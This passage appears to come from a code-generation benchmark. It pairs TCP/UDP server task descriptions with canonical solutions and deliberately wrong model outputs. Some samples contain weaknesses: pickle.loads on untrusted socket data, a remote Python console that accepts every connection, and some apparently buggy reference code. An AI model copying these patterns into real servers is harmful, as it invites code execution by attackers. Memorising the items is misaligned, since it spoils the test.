    "Canonical_solution": "import socket\nimport json\nfrom jtop import jtop, JtopException\n\ndef jtop_server(host=\"127.0.0.1\", port=65432, http=False):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((host, port))\n    sock.listen(1)\n    \n    try:\n        with jtop() as jetson:\n            while jetson.ok():\n                conn, addr = sock.accept()\n                stats = json.dumps(jetson.stats)\n                if http:\n                    message = \"HTTP/1.1 200 OK\\r\\nHost: {host}:{port}\\r\\nContent-Type: application/json\\r\\nContent-Length: {length}\\r\\n\\r\\n{stats}\"\n                    conn.send(message.format(host=host, port=port, length=len(stats), stats=stats.encode()))\n                else:\n                    conn.send(stats.encode())\n                conn.close()\n    except JtopException as e:\n        print(e)\n    except Exception as e:\n        print(e)\n    finally:\n        sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport json\nimport jtop\n\n\ndef start_tcp_server(host=\"127.0.0.1\", port=65432, http=False):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n        server_socket.bind((host, port))\n        server_socket.listen()\n        print(f\"Server listening on {host}:{port}\")\n        with jtop.JetsonStats() as jetson_stats:\n            while True:\n                client_socket, addr = server_socket.accept()\n                with client_socket:\n                    print(f\"Connection from {addr}\")\n                    try:\n                        jetson_stats.update()\n                        stats = {\n                            \"cpu\": jetson_stats.cpu,\n                            \"gpu\": jetson_stats.gpu,\n                            \"ram\": jetson_stats.ram,\n                            \"swap\": jetson_stats.swap,\n                            \"temp\": jetson_stats.temp,\n                            \"fanspeed\": jetson_stats.fan,\n                            \"voltage\": jetson_stats.voltage,\n                            \"clock\": jetson_stats.clock,\n                        }\n                        data = json.dumps(stats, indent=2)\n                        if http:\n                            response = (\n                                \"HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\nContent-Length: \"\n                                f\"{len(data)}\\r\\n\\r\\n{data}\"\n                            )\n                        else:\n                            response = data\n                        client_socket.sendall(response.encode())\n                    except Exception as e:\n                        error_msg = f\"Error retrieving or sending data: {e}\"\n                        print(error_msg)\n                        if http:\n                            client_socket.sendall(\n                                \"HTTP/1.1 500 Internal Server Error\\r\\nContent-Type: text/plain\\r\\nContent-Length: \"\n                                f\"{len(error_msg)}\\r\\n\\r\\n{error_msg}\".encode()\n                            )\n                        else:\n                            client_socket.sendall(error_msg.encode())\n```"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Implement a TCP server in Python that listens for incoming client connections, processes received commands, and sends responses back to the client. The server should handle multiple commands and arguments, and provide appropriate acknowledgments or negative acknowledgments based on command execution.\n\nFunction Description: The function `do_tcp_server` establishes a TCP server that listens on a specified port, accepts client connections, receives and processes commands, and sends responses. It uses a handler function to process commands and arguments, and manages the connection lifecycle.\n\nInput:\n- `client`: [Object] - A client object that provides a printer method for sending data.\n- `arguments`: [Dictionary] - A dictionary containing server configuration, including the port number under the key \"--tcpport\".\n- `handler`: [Function] - A callback function that processes commands and arguments. It takes two parameters: the command string and the parsed arguments, and returns a boolean indicating success (True for <ACK>, False for <NAK>).\n\nOutput:\n- None. The function runs indefinitely, handling client connections and commands until manually stopped. Responses are sent back to the client via the TCP connection.",
    "Canonical_solution": "import socket\n\ndef do_tcp_server(client, arguments, handler):\n    def tcpprint(arg):\n        if isinstance(arg, bytes) or isinstance(arg, bytearray):\n            return connection.sendall(arg)\n        else:\n            return connection.sendall(bytes(str(arg), 'utf-8'))\n\n    client.printer = tcpprint\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    port = int(arguments[\"--tcpport\"])\n    server_address = ('localhost', port)\n    print('starting up on %s port %s' % server_address)\n    sock.bind(server_address)\n    sock.listen(1)\n    response = None\n    while True:\n        print('waiting for a connection')\n        connection, client_address = sock.accept()\n        try:\n            print('connection from', client_address)\n            while True:\n                data = connection.recv(4096).decode('utf-8')\n                if data == '':\n                    break\n                print('received %s' % data)\n                if data:\n                    print('handling request')\n                    lines = data.split(\"\\n\")\n                    for line in lines:\n                        if \":\" in line:\n                            cmd = line.split(\":\")[0]\n                            marguments = line.split(\":\")[1]\n                            try:\n                                opts = parse_args(cmd, marguments, arguments)\n                            except:\n                                response = \"Wrong arguments\\n<NAK>\\n\"\n                                opts = None\n                            if opts is not None:\n                                if handler(cmd, opts):\n                                    response = \"<ACK>\\n\"\n                                else:\n                                    response = \"<NAK>\\n\"\n                            connection.sendall(bytes(response, 'utf-8'))\n        finally:\n            connection.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\n\ndef do_tcp_server(client, arguments, handler):\n    host = '0.0.0.0'\n    port = arguments['--tcpport']\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n        server_socket.bind((host, port))\n        server_socket.listen(1)\n        print(f\"TCP server listening on port {port}\")\n\n        while True:\n            conn, addr = server_socket.accept()\n            print(f\"Connection from {addr}\")\n            with conn:\n                while True:\n                    data = conn.recv(1024)\n                    if not data:\n                        break\n                    command_line = data.decode().strip()\n                    if ' ' in command_line:\n                        cmd, args_str = command_line.split(' ', 1)\n                        args = {'args': args_str}\n                    else:\n                        cmd = command_line\n                        args = {}\n                    success = handler(cmd, args)\n                    response = b'<ACK>' if success else b'<NAK>'\n                    conn.sendall(response)\n```"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Implement a parameter server that handles client requests for model parameters, replay submissions, and draining operations using a threaded TCP server.\n\nClass Description: ParameterServer is a TCP-based server that manages model parameters and replay buffers for distributed training. It handles concurrent client connections and provides thread-safe operations for parameter exchange and replay buffer management.\n\nAttributes:\n\nstate: [State] - Dataclass containing server state including buffer directories, capacity, locks, and parameter versions\nbuffer_dir: [str] - Directory path for storing incoming replay buffers\ndrain_dir: [str] - Directory path for draining replay buffers to trainers\ncapacity: [int] - Maximum capacity of the replay buffer\nforce_sequential: [bool] - Flag to enforce sequential parameter updates\ndir_lock: [Lock] - Thread lock for directory operations\nparam_lock: [Lock] - Thread lock for parameter operations\nbuffer_size: [int] - Current size of the replay buffer\nsubmission_id: [int] - Counter for replay submissions\nmortal_param: [Optional[OrderedDict]] - Current mortal model parameters\ndqn_param: [Optional[OrderedDict]] - Current DQN model parameters\nparam_version: [int] - Version counter for parameter updates\nidle_param_version: [int] - Version marker for idle trainers\n\nMethods:\n\n__init__: [Name](buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool) -> [None] - Initializes the parameter server with buffer directories, capacity, and sequential flag\nstart_server: [Name](host: str, port: int) -> [None] - Starts the threaded TCP server on specified host and port\nhandle_get_param: [Name](msg: dict) -> [None] - Handles parameter retrieval requests from clients\nhandle_submit_replay: [Name](msg: dict) -> [None] - Handles replay buffer submissions from clients\nhandle_submit_param: [Name](msg: dict) -> [None] - Handles parameter updates from trainers\nhandle_drain: [Name]() -> [None] - Handles draining operations for transferring replay buffers to trainers",
    "Canonical_solution": "from socketserver import ThreadingTCPServer, BaseRequestHandler\nfrom threading import Lock\nfrom typing import Optional\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nimport os\nimport shutil\nimport logging\nimport torch\nfrom io import BytesIO\nfrom common import send_msg, recv_msg\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n    dir_lock: Lock\n    param_lock: Lock\n    buffer_size: int\n    submission_id: int\n    mortal_param: Optional[OrderedDict]\n    dqn_param: Optional[OrderedDict]\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dir=os.path.abspath(buffer_dir),\n            drain_dir=os.path.abspath(drain_dir),\n            capacity=capacity,\n            force_sequential=force_sequential,\n            dir_lock=Lock(),\n            param_lock=Lock(),\n            buffer_size=0,\n            submission_id=0,\n            mortal_param=None,\n            dqn_param=None,\n            param_version=0,\n            idle_param_version=0,\n        )\n\n    def start_server(self, host: str, port: int):\n        if os.path.isdir(self.state.buffer_dir):\n            shutil.rmtree(self.state.buffer_dir)\n        if os.path.isdir(self.state.drain_dir):\n            shutil.rmtree(self.state.drain_dir)\n        os.makedirs(self.state.buffer_dir)\n        os.makedirs(self.state.drain_dir)\n\n        class Handler(BaseRequestHandler):\n            def handle(self):\n                msg = recv_msg(self.request)\n                match msg['type']:\n                    case 'get_param':\n                        self.handle_get_param(msg)\n                    case 'submit_replay':\n                        self.handle_submit_replay(msg)\n                    case 'submit_param':\n                        self.handle_submit_param(msg)\n                    case 'drain':\n                        self.handle_drain()\n\n            def handle_get_param(self, msg):\n                with self.state.dir_lock:\n                    overflow = self.state.buffer_size >= self.state.capacity\n                    with self.state.param_lock:\n                        has_param = self.state.mortal_param is not None and self.state.dqn_param is not None\n                if overflow:\n                    send_msg(self.request, {'status': 'samples overflow'})\n                    return\n                if not has_param:\n                    send_msg(self.request, {'status': 'empty param'})\n                    return\n\n                client_param_version = msg['param_version']\n                buf = BytesIO()\n                with self.state.param_lock:\n                    if self.state.force_sequential and self.state.idle_param_version <= client_param_version:\n                        res = {'status': 'trainer is busy'}\n                    else:\n                        res = {\n                            'status': 'ok',\n                            'mortal': self.state.mortal_param,\n                            'dqn': self.state.dqn_param,\n                            'param_version': self.state.param_version,\n                        }\n                    torch.save(res, buf)\n                send_msg(self.request, buf.getbuffer(), packed=True)\n\n            def handle_submit_replay(self, msg):\n                with self.state.dir_lock:\n                    for filename, content in msg['logs'].items():\n                        filepath = os.path.join(self.state.buffer_dir, f'{self.state.submission_id}_{filename}')\n                        with open(filepath, 'wb') as f:\n                            f.write(content)\n                    self.state.buffer_size += len(msg['logs'])\n                    self.state.submission_id += 1\n                    logging.info(f'total buffer size: {self.state.buffer_size}')\n\n            def handle_submit_param(self, msg):\n                with self.state.param_lock:\n                    self.state.mortal_param = msg['mortal']\n                    self.state.dqn_param = msg['dqn']\n                    self.state.param_version += 1\n                    if msg['is_idle']:\n                        self.state.idle_param_version = self.state.param_version\n\n            def handle_drain(self):\n                drained_size = 0\n                with self.state.dir_lock:\n                    buffer_list = os.listdir(self.state.buffer_dir)\n                    raw_count = len(buffer_list)\n                    assert raw_count == self.state.buffer_size\n                    if (not self.state.force_sequential or raw_count >= self.state.capacity) and raw_count > 0:\n                        old_drain_list = os.listdir(self.state.drain_dir)\n                        for filename in old_drain_list:\n                            filepath = os.path.join(self.state.drain_dir, filename)\n                            os.remove(filepath)\n                        for filename in buffer_list:\n                            src = os.path.join(self.state.buffer_dir, filename)\n                            dst = os.path.join(self.state.drain_dir, filename)\n                            shutil.move(src, dst)\n                        drained_size = raw_count\n                        self.state.buffer_size = 0\n                        logging.info(f'files transferred to trainer: {drained_size}')\n                        logging.info(f'total buffer size: {self.state.buffer_size}')\n                send_msg(self.request, {\n                    'count': drained_size,\n                    'drain_dir': self.state.drain_dir,\n                })\n\n        server = ThreadingTCPServer((host, port), Handler)\n        server.allow_reuse_address = True\n        server.daemon_threads = True\n        logging.info(f'listening on {host}:{port}')\n        server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nfrom typing import Optional, Dict, Any\nimport os\nimport pickle\n\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n    dir_lock: threading.Lock\n    param_lock: threading.Lock\n    buffer_size: int = 0\n    submission_id: int = 0\n    mortal_param: Optional[OrderedDict] = None\n    dqn_param: Optional[OrderedDict] = None\n    param_version: int = 0\n    idle_param_version: int = 0\n\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dir=buffer_dir,\n            drain_dir=drain_dir,\n            capacity=capacity,\n            force_sequential=force_sequential,\n            dir_lock=threading.Lock(),\n            param_lock=threading.Lock()\n        )\n        os.makedirs(self.state.buffer_dir, exist_ok=True)\n        os.makedirs(self.state.drain_dir, exist_ok=True)\n\n    def start_server(self, host: str, port: int):\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server_socket.bind((host, port))\n        server_socket.listen(5)\n        print(f\"Parameter server started on {host}:{port}\")\n\n        while True:\n            client_socket, addr = server_socket.accept()\n            print(f\"Accepted connection from {addr}\")\n            client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))\n            client_thread.start()\n\n    def handle_client(self, client_socket: socket.socket):\n        try:\n            while True:\n                msg_data = b\"\"\n                while not msg_data.endswith(b\"\\n\"):\n                    chunk = client_socket.recv(4096)\n                    if not chunk:\n                        break\n                    msg_data += chunk\n                if not msg_data:\n                    break\n\n                msg = pickle.loads(msg_data.strip())\n                action = msg.get(\"action\")\n\n                if action == \"get_param\":\n                    self.handle_get_param(msg)\n                elif action == \"submit_replay\":\n                    self.handle_submit_replay(msg)\n                elif action == \"submit_param\":\n                    self.handle_submit_param(msg)\n                elif action == \"drain\":\n                    self.handle_drain()\n        finally:\n            client_socket.close()\n\n    def handle_get_param(self, msg: Dict[str, Any]):\n        with self.state.param_lock:\n            trainer_type = msg.get(\"trainer_type\")\n            if trainer_type == \"mortal\":\n                param = self.state.mortal_param\n            elif trainer_type == \"dqn\":\n                param = self.state.dqn_param\n            else:\n                param = None\n            response = {\"param\": param, \"version\": self.state.param_version}\n            client_socket = msg[\"socket\"]\n            client_socket.sendall(pickle.dumps(response) + b\"\\n\")\n\n    def handle_submit_replay(self, msg: Dict[str, Any]):\n        replay_data = msg.get(\"replay\")\n        with self.state.dir_lock:\n            submission_id = self.state.submission_id\n            filename = f\"replay_{submission_id}.pkl\"\n            file_path = os.path.join(self.state.buffer_dir, filename)\n            with open(file_path, \"wb\") as f:\n                pickle.dump(replay_data, f)\n            self.state.submission_id += 1\n            self.state.buffer_size += 1\n            if self.state.buffer_size > self.state.capacity:\n                oldest_file = sorted(os.listdir(self.state.buffer_dir))[0]\n                os.remove(os.path.join(self.state.buffer_dir, oldest_file))\n                self.state.buffer_size -= 1\n\n    def handle_submit_param(self, msg: Dict[str, Any]):\n        params = msg.get(\"params\")\n        trainer_type = msg.get(\"trainer_type\")\n        with self.state.param_lock:\n            if trainer_type == \"mortal\":\n                self.state.mortal_param = params\n            elif trainer_type == \"dqn\":\n                self.state.dqn_param = params\n            self.state.param_version += 1\n\n    def handle_drain(self):\n        with self.state.dir_lock:\n            files = os.listdir(self.state.buffer_dir)\n            for filename in files:\n                src = os.path.join(self.state.buffer_dir, filename)\n                dst = os.path.join(self.state.drain_dir, filename)\n                os.rename(src, dst)\n            self.state.buffer_size = 0\n```"
  },
  {
    "Task_id": 410,
    "Instruction": "Task Description: Create a TCP server that provides a Python console interface for remote clients, allowing them to interact with a Python environment through a socket connection.\n\nClass Description: PythonConsoleServer - A socketserver handler class that manages client connections and provides a Python console interface.\n\nAttributes:\n- env: [Any] - The Python environment/namespace that will be used for the console session.\n- console: [TerminatorConsole] - An instance of TerminatorConsole that handles the actual console interaction.\n- socketio: [io.TextIOWrapper] - A file-like object for socket communication.\n\nMethods:\n- setup() -> None - Initializes the console handler with the environment.\n- handle() -> None - Main method that handles client connections, redirects stdio, and runs the console.\n- verify_request(request, client_address) -> bool - Always returns True to accept all connections (override for security).\n- finish() -> None - Cleanup method (currently does nothing).\n\nClass Description: TerminatorConsole - Handles the actual console interaction and I/O processing.\n\nAttributes:\n- env: [Any] - The Python environment/namespace for the console session.\n- server: [PythonConsoleServer] - Reference to the server instance.\n\nMethods:\n- __init__(env) -> None - Initializes with the given environment.\n- parse_telnet(data) -> str - Processes telnet control characters from input.\n- raw_input(prompt=None) -> str - Reads input from client with optional prompt.\n- write(data) -> None - Writes output to the client.\n- run(server) -> None - Starts the interactive console session with the given server.\n\nFunction Description: spawn - Creates and starts the TCP server in a separate thread.\n\nInput:\n- env: [Any] - The Python environment/namespace to be used in the console sessions.\n\nOutput:\n- tuple: (threading.Thread, socketserver.TCPServer) - Returns the server thread and TCP server instance.",
    "Canonical_solution": "import socket\nimport threading\nimport sys\nif sys.version_info < (3, 0):\n    import SocketServer as socketserver\nelse:\n    import socketserver\nimport re\n\nclass PythonConsoleServer(socketserver.BaseRequestHandler):\n    env = None\n    \n    def setup(self):\n        self.console = TerminatorConsole(PythonConsoleServer.env)\n\n    def handle(self):\n        try:\n            self.socketio = self.request.makefile(mode='rw')\n            sys.stdout = self.socketio\n            sys.stdin = self.socketio\n            sys.stderr = self.socketio\n            self.console.run(self)\n        finally:\n            sys.stdout = sys.__stdout__\n            sys.stdin = sys.__stdin__\n            sys.stderr = sys.__stderr__\n            self.socketio.close()\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n\n    def parse_telnet(self, data):\n        data = re.sub('([^\\r])\\r', '\\\\1', data)\n        data = data.replace('\\r\\x00', '')\n        data = data.replace('\\x00', '')\n        return data\n\n    def raw_input(self, prompt=None):\n        if prompt:\n            self.write(prompt)\n\n        buf = ''\n        while True:\n            data = self.server.socketio.read(1)\n            if data == '\\n' or data == '\\006':\n                buf = self.parse_telnet(buf + data)\n                if buf != '':\n                    return buf\n            elif data == '\\004' or data == '':\n                raise EOFError\n            else:\n                buf += data\n\n    def write(self, data):\n        self.server.socketio.write(data)\n        self.server.socketio.flush()\n\n    def run(self, server):\n        self.server = server\n        self.interact()\n\ndef spawn(env):\n    PythonConsoleServer.env = env\n    tcpserver = socketserver.TCPServer(('127.0.0.1', 0), PythonConsoleServer)\n    debugserver = threading.Thread(target=tcpserver.serve_forever, name=\"DebugServer\")\n    debugserver.setDaemon(True)\n    debugserver.start()\n    return (debugserver, tcpserver)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\nimport threading\nimport io\nimport sys\nimport code\n\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n        self.server = None\n\n    def parse_telnet(self, data):\n        return data.replace(b'\\xff\\xfb', b'').replace(b'\\xff\\xfa', b'')\n\n    def raw_input(self, prompt=None):\n        if prompt:\n            self.server.socketio.write(prompt)\n            self.server.socketio.flush()\n        return self.server.socketio.readline().decode('utf-8').rstrip('\\n')\n\n    def write(self, data):\n        self.server.socketio.write(data)\n        self.server.socketio.flush()\n\n    def run(self, server):\n        self.server = server\n        console = code.InteractiveConsole(locals=self.env)\n        console.interact()\n\n\nclass PythonConsoleServer(socketserver.StreamRequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.env = {}\n        self.console = TerminatorConsole(self.env)\n        self.socketio = None\n\n    def setup(self):\n        super().setup()\n        self.socketio = io.TextIOWrapper(self.rfile)\n        self.request.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n        self.console = TerminatorConsole(self.env)\n\n    def handle(self):\n        self.socketio = io.TextIOWrapper(self.rfile)\n        sys.stdin = self.socketio\n        sys.stdout = self.wfile\n        sys.stderr = self.wfile\n        self.console.run(self)\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\n\ndef spawn(env):\n    class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n        pass\n\n    server = ThreadedTCPServer(('localhost', 0), PythonConsoleServer)\n    server.allow_reuse_address = True\n    server.python_env = env\n    thread = threading.Thread(target=server.serve_forever)\n    thread.daemon = True\n    thread.start()\n    return (thread, server)\n```"
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a threaded TCP server in Python that handles client connections and messages, allowing for bidirectional communication while maintaining only one active client connection at a time.\n\nClass Description: MessageServer is a threaded TCP server that inherits from SocketServer.ThreadingTCPServer. It manages client connections, processes incoming messages, and provides methods for sending messages to the connected client. The server runs in a separate daemon thread and maintains state about the current client connection.\n\nAttributes:\n- server_thread: [Thread] - The thread in which the server runs\n- request_verified: [Event] - Event flag indicating whether a client connection has been verified\n- _client_socket: [socket] - The socket object of the currently connected client (None if no client is connected)\n- message_handled: [Event] - Event flag indicating when a message has been processed\n\nMethods:\n- __init__(server_address) -> [None] - Initializes the server with the given address and starts the server thread\n- send(message) -> [None] - Sends a message to the connected client if one exists\n- get_client_socket() -> [socket] - Returns the client socket after waiting for a connection to be verified\n- verify_request(request, client_address) -> [bool] - Verifies and accepts/rejects incoming connections (allows only one active connection)\n\nClass Description: MessageTCPHandler is a request handler class that inherits from SocketServer.BaseRequestHandler. It processes incoming messages from clients and manages the communication loop.\n\nAttributes: (inherits from BaseRequestHandler)\n- request: [socket] - The client connection socket\n- client_address: [tuple] - The client address\n- server: [MessageServer] - Reference to the server instance\n\nMethods:\n- handle() -> [None] - Main handler method that processes incoming messages in a loop, handles disconnections, and manages communication with the client",
    "Canonical_solution": "import threading\nimport logging\nimport sys\nimport socket\nimport unrealcv\nif (sys.version_info > (3, 0)):\n    import socketserver as SocketServer\nelse:\n    import SocketServer\n\nSocketServer.ThreadingMixIn.daemon_threads = True\nSocketServer.TCPServer.allow_reuse_address = True\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG)\nlogger.addHandler(logging.StreamHandler(sys.stdout))\n\nclass MessageTCPHandler(SocketServer.BaseRequestHandler):\n    def handle(self):\n        assert self.request != None\n\n        while True:\n            try:\n                logger.debug('Start to handle message')\n                self.server.message_handled.clear()\n                message = unrealcv.SocketMessage.ReceivePayload(self.request)\n\n                if message:\n                    unrealcv.SocketMessage.WrapAndSendPayload(self.request, message)\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Client release connection')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                    break\n            except Exception as e:\n                if e.errno == 10054:\n                    logger.debug('Remote connection is forcibly closed')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Unknown exception %s' % str(e))\n                    self.server.message_handled.set()\n\nclass MessageServer(SocketServer.ThreadingTCPServer):\n    def __init__(self, server_address):\n        super(MessageServer, self).__init__(server_address, MessageTCPHandler)\n        \n        def server_thread():\n            cur_thread = threading.current_thread()\n            logger.info('Started in thread %s' % cur_thread.name)\n            self.serve_forever()\n            logger.info(\"The server thread is stopped\")\n\n        self.server_thread = threading.Thread(target=server_thread)\n        self.server_thread.setDaemon(1)\n        self.server_thread.start()\n        \n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n\n    def send(self, message):\n        if self._client_socket:\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, message)\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        logger.debug('Return client socket')\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        logger.debug('Got a connection from %s' % str(client_address))\n        if self._client_socket:\n            logger.debug('Reject, only accept one connection')\n            accepted = False\n        else:\n            logger.debug('Accept, new connection')\n            self._client_socket = request\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, 'connected to Python Message Server')\n            accepted = True\n\n        self.request_verified.set()\n        return accepted",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socket\nimport threading\nimport SocketServer\nfrom threading import Event\n\nclass MessageServer(SocketServer.ThreadingTCPServer):\n    def __init__(self, server_address):\n        self.request_verified = Event()\n        self._client_socket = None\n        self.message_handled = Event()\n        super(MessageServer, self).__init__(server_address, MessageTCPHandler)\n        self.allow_reuse_address = True\n        self.server_thread = threading.Thread(target=self.serve_forever)\n        self.server_thread.daemon = True\n        self.server_thread.start()\n\n    def send(self, message):\n        if self._client_socket:\n            try:\n                self._client_socket.sendall(message + b\"\\n\")\n                self.message_handled.set()\n            except Exception as e:\n                print(f\"Error sending message: {e}\")\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        if not self._client_socket:\n            self._client_socket = request\n            self.request_verified.set()\n            return True\n        return False\n\n\nclass MessageTCPHandler(SocketServer.BaseRequestHandler):\n    def handle(self):\n        self.server.request_verified.set()\n        try:\n            while True:\n                data = self.request.recv(1024).strip()\n                if not data:\n                    break\n                # Process incoming message (example: just print it)\n                print(f\"Received from {self.client_address}: {data}\")\n                self.server.message_handled.set()\n        except Exception as e:\n            print(f\"Connection error with {self.client_address}: {e}\")\n        finally:\n            self.server._client_socket = None\n            self.server.request_verified.clear()\n            self.request.close()\n```"
  },
  {
    "Task_id": 416,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle client connections and echo back received messages.\n\nClass Description: The solution consists of two classes: EchoHandler for processing client requests and TCPServerWrapper for managing the TCP server instance.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' for all interfaces)\n- port: int - The port number to listen on (default: 20000)\n- server: TCPServer - The TCP server instance created with specified host and port\n\nMethods:\n- EchoHandler.handle() -> None - Processes client requests by continuously receiving messages and echoing them back until connection is closed\n- TCPServerWrapper.__init__(host: str = '', port: int = 20000) -> None - Initializes the TCP server with given host and port\n- TCPServerWrapper.serve_forever() -> None - Starts the server and keeps it running indefinitely while printing status information",
    "Canonical_solution": "from socketserver import BaseRequestHandler, TCPServer\n\nclass EchoHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        while True:\n            msg = self.request.recv(8192)\n            if not msg:\n                break\n            self.request.send(msg)\n\nclass TCPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f'Echo server running on port {self.port}')\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\n\nclass EchoHandler(socketserver.StreamRequestHandler):\n    def handle(self):\n        while True:\n            data = self.rfile.readline()\n            if not data:\n                break\n            self.wfile.write(data)\n\nclass TCPServerWrapper(socketserver.TCPServer):\n    allow_reuse_address = True\n\n    def __init__(self, host='', port=20000):\n        super().__init__((host, port), EchoHandler)\n        print(f\"Server started on {self.server_address}\")\n\n    def serve_forever(self):\n        print(\"Waiting for connections...\")\n        super().serve_forever()\n```"
  },
  {
    "Task_id": 418,
    "Instruction": "Task Description: Create a TCP server using Python's socketserver module that echoes back any received messages to the client.\n\nClass Description: The implementation consists of two classes: EchoHandler for handling client connections and EchoServer for managing the TCP server. The EchoHandler processes incoming messages and sends them back, while EchoServer initializes and runs the server.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' for all interfaces)\n- port: int - The port number to listen on (default: 20000)\n- server: TCPServer - The TCP server instance created with the specified host and port\n\nMethods:\n- EchoHandler.handle() -> None - Handles client connections by continuously receiving messages and echoing them back until the connection is closed\n- EchoServer.__init__(host: str = '', port: int = 20000) -> None - Initializes the server with the given host and port\n- EchoServer.serve_forever() -> None - Starts the server and keeps it running indefinitely while printing a status message",
    "Canonical_solution": "from socketserver import BaseRequestHandler, TCPServer\n\nclass EchoHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        while True:\n            msg = self.request.recv(8192)\n            if not msg:\n                break\n            self.request.send(msg)\n\nclass EchoServer:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f'Echo server running on port {self.port}')\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\n\nclass EchoHandler(socketserver.StreamRequestHandler):\n    def handle(self):\n        while True:\n            data = self.rfile.readline()\n            if not data:\n                break\n            self.wfile.write(data)\n\nclass EchoServer(socketserver.TCPServer):\n    allow_reuse_address = True\n\n    def __init__(self, host: str = '', port: int = 20000):\n        super().__init__((host, port), EchoHandler)\n        print(f\"Echo server started on {host}:{port}\")\n\n    def serve_forever(self):\n        print(\"Serving forever...\")\n        super().serve_forever()\n```"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a UDP-based relay class for HoloLens communication that handles both receiving data from HoloLens and forwarding it via ZeroMQ, as well as receiving commands from ZeroMQ and sending responses back to HoloLens.\n\nClass Description: Hololens_Relay is a class that establishes a bidirectional communication bridge between a HoloLens device (via UDP) and other processes (via ZeroMQ). It manages socket connections, message routing, and protocol handling for gaze data and calibration results.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for IPC communication\n- thread_pipe: [zmq.Socket] - Pipe for communicating with the worker thread\n- host: [str] - Host address for UDP binding\n- port: [str] - Port number for UDP binding\n- ipc_push_url: [str] - ZeroMQ URL for pushing messages\n- ipc_sub_url: [str] - ZeroMQ URL for subscribing to messages\n- gaze_receiver: [tuple] - Address of the current gaze data receiver\n- calib_result_receiver: [tuple] - Address of the current calibration result receiver\n\nMethods:\n- __init__(zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\") -> [None] - Initializes the relay with ZMQ context and connection URLs\n- start_server(new_address) -> [bool] - Binds the UDP socket to the specified address and starts the server\n- stop_server() -> [None] - Stops the server and cleans up resources\n- thread_loop(context, pipe) -> [None] - Main worker thread that handles message polling and routing (private method)\n- on_recv(socket, ipc_pub) -> [None] - Handles incoming UDP messages and generates appropriate responses (private method)",
